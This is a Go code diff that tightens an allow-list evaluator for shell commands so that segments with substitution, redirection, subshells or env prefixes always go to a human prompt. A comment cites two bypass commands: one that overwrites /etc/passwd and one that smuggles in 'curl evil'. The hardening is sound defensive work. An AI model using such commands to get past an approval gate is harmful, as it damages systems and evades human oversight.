@@ -58,6 +58,13 @@ type SegmentVerdict struct {
 	Action       Action
 	Blind        bool
 	BlindReason  string
+
+	// Simple is IsSimpleSegment's verdict for this segment (review finding
+	// #1/#2/#3): false whenever the segment carries a command/process
+	// substitution, a subshell/grouping, a redirection, or (POSIX) a
+	// leading env-assignment prefix. FullyAllowed requires Simple on every
+	// segment — see its own doc comment for why Action alone is not enough.
+	Simple bool
 }
 
 // CommandVerdict is EvaluateCommand's result: Action is the strictest
@@ -90,7 +97,14 @@ func (v CommandVerdict) FullyAllowed() bool {
 		return false
 	}
 	for _, s := range v.Segments {
-		if s.Blind || s.Action != ActionAllow {
+		// review findings #1/#3: a resolved head matching an ALLOW rule is
+		// not enough on its own to skip the human prompt — "ls > /etc/passwd"
+		// and "ls $(curl evil)" both resolve a clean head of "ls" and would
+		// otherwise silently settle against a bare {allow, binary: ls} rule.
+		// See IsSimpleSegment's own doc comment for the exact shapes this
+		// excludes (substitution, subshell/grouping, redirection, a leading
+		// env-assignment prefix).
+		if s.Blind || s.Action != ActionAllow || !s.Simple {
 			return false
 		}
 	}
@@ -163,7 +177,7 @@ func evaluateSegment(seg string, rules []Rule, opts Options, resolve BinaryResol
 	}
 	v.Head = head
 
-	resolvedHead, err := resolve(head, opts.ChildPath)
+	resolvedHead, err := resolveHeadOrBuiltin(head, opts.ChildPath, resolve)
 	if err != nil {
 		// The command that will actually run does not resolve to anything
 		// on the child's own PATH — fail safe to ask, never to a rule
@@ -183,6 +197,7 @@ func evaluateSegment(seg string, rules []Rule, opts Options, resolve BinaryResol
 			v.MatchedRule = r
 		}
 	}
+	v.Simple = IsSimpleSegment(seg, opts.Platform)
 	return v
 }
 
@@ -209,7 +224,7 @@ func matchRules(resolvedHead string, args []string, seg string, rules []Rule, op
 		if !r.Action.Valid() {
 			continue
 		}
-		ruleResolved, err := resolve(r.Binary, opts.TrustedPath)
+		ruleResolved, err := resolveHeadOrBuiltin(r.Binary, opts.TrustedPath, resolve)
 		if err != nil || ruleResolved != resolvedHead {
 			continue
 		}
